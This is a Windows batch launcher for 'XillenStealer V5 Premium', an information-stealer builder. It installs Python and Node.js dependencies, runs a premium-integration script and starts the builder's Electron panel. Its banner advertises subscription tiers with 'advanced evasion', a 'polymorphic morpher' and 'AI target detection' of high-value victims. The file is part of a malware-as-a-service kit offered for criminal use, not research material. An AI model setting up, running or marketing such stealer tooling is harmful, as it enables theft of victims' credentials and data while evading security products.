@echo off
title XillenStealer V5 Premium - Launcher
color 0A

echo.
echo  ██╗  ██╗██╗██╗     ██╗     ███████╗███╗   ██╗    ███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗ 
echo  ╚██╗██╔╝██║██║     ██║     ██╔════╝████╗  ██║    ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗
echo   ╚███╔╝ ██║██║     ██║     █████╗  ██╔██╗ ██║    ███████╗   ██║   █████╗  ███████║██║     █████╗  ██████╔╝
echo   ██╔██╗ ██║██║     ██║     ██╔══╝  ██║╚██╗██║    ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
echo  ██╔╝ ██╗██║███████╗███████╗███████╗██║ ╚████║    ███████║   ██║   ███████╗██║  ██║███████╗███████╗██║  ██║
echo  ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝    ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
echo.
echo                           🚀 V5 PREMIUM EDITION - ADVANCED STEALER BUILDER 🚀
echo.
echo  ═══════════════════════════════════════════════════════════════════════════════════════════════════════════
echo.

echo [INFO] Checking system requirements...
echo.

REM Check Python
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Python not found! Please install Python 3.8+
    pause
    exit /b 1
)

REM Check Node.js
node --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Node.js not found! Please install Node.js 16+
    pause
    exit /b 1
)

echo [OK] Python and Node.js found
echo.

echo [INFO] Installing Python dependencies...
pip install -r requirements.txt
if %errorlevel% neq 0 (
    echo [ERROR] Failed to install Python dependencies
    pause
    exit /b 1
)

echo [OK] Python dependencies installed
echo.

echo [INFO] Installing Node.js dependencies...
cd electron_builder
npm install
if %errorlevel% neq 0 (
    echo [ERROR] Failed to install Node.js dependencies
    pause
    exit /b 1
)

echo [OK] Node.js dependencies installed
echo.

echo [INFO] Initializing Premium Features...
cd ..
python core/premium_integration.py
if %errorlevel% neq 0 (
    echo [WARNING] Premium features initialization failed, continuing with basic version
)

echo.
echo ═══════════════════════════════════════════════════════════════════════════════════════════════════════════
echo.
echo  🎯 PREMIUM FEATURES AVAILABLE:
echo.
echo  💎 BASIC ($99/month)    - Extended collection, Cloud sync, Priority support
echo  🚀 PRO ($299/month)     - AI detection, Advanced evasion, Polymorphic morpher
echo  🏢 ENTERPRISE ($599/month) - White label, Custom deployment, SLA guarantee
echo.
echo  🤖 AI Target Detection  - Automatically detect high-value targets
echo  ☁️ Cloud Panel         - Sync data across devices
echo  🔑 Telegram Bot        - Manage subscriptions via Telegram
echo  🌐 Web Panel          - Advanced subscription management
echo  🛡️ Advanced Protection - Multiple evasion techniques
echo.
echo ═══════════════════════════════════════════════════════════════════════════════════════════════════════════
echo.

echo [INFO] Starting XillenStealer V5 Premium...
echo.
echo  📍 Main Panel: http://localhost:3000 (after startup)
echo  🌐 Web Panel:  http://localhost:5000 (subscription management)
echo  🤖 Telegram:   @YourBotName (subscription bot)
echo.
echo  Press Ctrl+C to stop the application
echo.

cd electron_builder
npm start

echo.
echo [INFO] XillenStealer V5 Premium stopped
pause
